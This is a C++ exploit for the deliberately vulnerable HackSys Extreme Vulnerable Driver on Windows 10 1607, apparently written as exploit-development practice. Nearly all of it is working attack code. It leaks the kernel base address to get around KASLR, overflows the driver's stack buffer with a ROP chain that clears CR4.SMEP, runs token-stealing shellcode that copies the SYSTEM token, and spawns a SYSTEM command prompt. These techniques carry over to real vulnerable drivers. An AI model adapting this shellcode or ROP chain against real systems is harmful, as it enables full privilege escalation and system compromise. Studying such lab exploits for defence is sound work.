#include <Windows.h>
#include <iostream>
#include <Psapi.h>

// getting ready to go with a SMEP bypass, ROP gadgets inbound, bye bye CR4.SMEP 20th bit
// next I will write an exploit using PTE tables to flip u/s for this page

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define HEVD_VULNERABLE_IOCTL 0x222003


void spawnElevatedCmd() {

	std::cout << "[+] Spawning new CMD prompt with swapped SYSTEM token\n\n";

	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInformation;

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

	int aCreated = CreateProcessA("C:\\Windows\\System32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		0,
		NULL,
		NULL,
		NULL,
		&StartupInfo, &ProcessInformation);
	if (aCreated == FALSE) {
		std::cout << "[!] failed to launch process - " << GetLastError() << std::endl;

	}
	WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
	CloseHandle(ProcessInformation.hProcess);
	CloseHandle(ProcessInformation.hThread);
}

INT64 kernelBase() {

	std::cout << "[+] Preparing KASLR information leak\n";

	LPVOID drivers[1024];
	DWORD cbNeeded;

	EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
	PVOID KernelBaseAddress = { 0 };

	KernelBaseAddress = drivers[0];
	std::cout << "[+] Successfully leaked the kernel base address\n";
	std::cout << "[>] Kernel base address -  0x" << KernelBaseAddress << std::endl;
	PVOID ntoskrnl_base_addr = KernelBaseAddress;

	return (INT64)ntoskrnl_base_addr;
}

int main() {

	std::cout << "\nHEVD - Windows 10 64-bit 1607 - Stack Overflow with SMEP bypass\n\n";

	HANDLE hDevice = CreateFileA(DEVICE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		std::cout << "[!] Failed to set up the handle for our device - " << GetLastError() << std::endl;
	}
	else {
		std::cout << "[+] Success in setting up the handle for our device - " << DEVICE_NAME << std::endl;
	}

	std::cout << "[+] Preparing our Win10 token stealing shellcode\n";

	char shellcodePayload[] =

		// gathering offsets for structure members on 1607
		//   +0x2e8 UniqueProcessId  : Ptr64 Void
		//   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
		//   +0x358 Token            : _EX_FAST_REF

		"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"  
		"\x4C\x8B\x82\xB8\x00\x00\x00"      
		"\x4D\x8B\x88\xf0\x02\x00\x00"            
		"\x49\x8B\x09"                            
		"\x48\x8B\x51\xF8"                    
		"\x48\x83\xFA\x04"                        
		"\x74\x05"                           
		"\x48\x8B\x09"                              
		"\xEB\xF1"                              
		"\x48\x8B\x41\x68"                     
		"\x24\xF0"                                  
		"\x49\x89\x80\x58\x03\x00\x00"            
		"\x48\x83\xC4\x40"                     
		"\x48\x31\xF6"                           
		"\x48\x31\xC0"                     
		"\xc3";

	std::cout << "[+] Allocating usermode region as RWX for our shellcode\n";

	LPVOID shellcode_address = VirtualAlloc(NULL,
		sizeof(shellcodePayload),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	std::cout << "[+] Moving shellcode to our allocated RWX region\n";
	memcpy(shellcode_address, shellcodePayload, sizeof(shellcodePayload));
	std::cout << "[>] Shellcode allocated at @ 0x" << shellcode_address << std::endl;

	// leaking kernel addresses to find offsets
	INT64 kernelBaseAddr = kernelBase();
	// preparing the ROP chain to disable CR4.SMEP
	std::cout << "[+] Preparing ROP chain to disable SMEP\n";

	BYTE userBuffer[2088] = { 0 };

	INT64  pop_rcx_ret = kernelBaseAddr + 0x146580;
	std::cout << "[>] pop rcx ; ret - gadget @ 0x" << std::hex << pop_rcx_ret << std::endl;
	INT64  smep_killer = 0x70678;
	std::cout << "[>] smep killer value @ 0x" << std::hex << &smep_killer << std::endl;
	INT64  mov_cr4_rcx = kernelBaseAddr + 0x3D6431;
	std::cout << "[>] mov cr4, rcx ; ret - gadget @ 0x" << std::hex << mov_cr4_rcx << std::endl;

	// preparing userbuffer to send to the driver

	// set up the intial buffer
	memset(userBuffer, '\x41', 2056);
	memcpy(userBuffer + 2056, (PINT64)&pop_rcx_ret, 8);
	memcpy(userBuffer + 2064, (PINT64)&smep_killer, 8); // get the value you want into CR4.SMEP userBuffer + 2064
	memcpy(userBuffer + 2072, (PINT64)&mov_cr4_rcx, 8);
	memcpy(userBuffer + 2080, (PINT64)&shellcode_address, 8); // now load your shellcode pointer after these rets
	
	std::cout << "[>] userBuffer is located @ 0x" << &userBuffer << std::endl;

	DWORD sizeReturn = 0x0;
	std::cout << "[+] Sending final buffer of size: " << sizeof(userBuffer) << std::endl;
	int deviceCom = DeviceIoControl(hDevice,
		HEVD_VULNERABLE_IOCTL,
		&userBuffer,
		sizeof(userBuffer),
		NULL,
		0,
		&sizeReturn,
		NULL);
	if (deviceCom) {
		spawnElevatedCmd();
	}
	else {
		std::cout << "[!] Failed to send payload to the device driver\n";
	}
	return 0;
}
